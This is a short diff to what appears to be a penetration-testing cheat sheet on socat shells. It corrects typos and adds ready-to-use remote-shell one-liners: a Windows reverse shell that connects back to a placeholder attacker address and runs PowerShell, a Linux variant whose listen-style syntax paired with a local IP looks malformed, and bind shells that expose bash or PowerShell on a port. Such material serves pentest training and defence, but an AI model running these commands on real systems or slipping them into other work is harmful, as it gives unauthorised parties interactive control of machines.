@@ -34,13 +34,24 @@ Basic Listener: `socat -d -d TCP-LISTEN:<PORT> STDOUT`
 On Windows we use this command to connect back:
 
 ```powershell
-socket TCP:<LOCAL-IP>:<LOCAP-PORT> EXEC:powershell.exe, pipes
+socat TCP:<LOCAL-IP>:<LOCAP-PORT> EXEC:powershell.exe, pipes
 ```
 
 > The `pipes` option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output.&#x20;
 
 The equivalent command for Linux target:
 
+```bash
+socat TCP-L:<LOCAL_IP>:<LOCAP-PORT> EXEC:"/bin/bash" -li
 ```
-scoket TCP-L:<PORT> EXEC:"/bin/bash" -li
+
+Bind Shell Command:
+
+```ps
+## Linux:
+socat TCP-L:<PORT> EXEC:"bash" -li
+
+## Windows
+socat TCP-L:<PORT> EXEC:powershell.exe, pipes
 ```
+
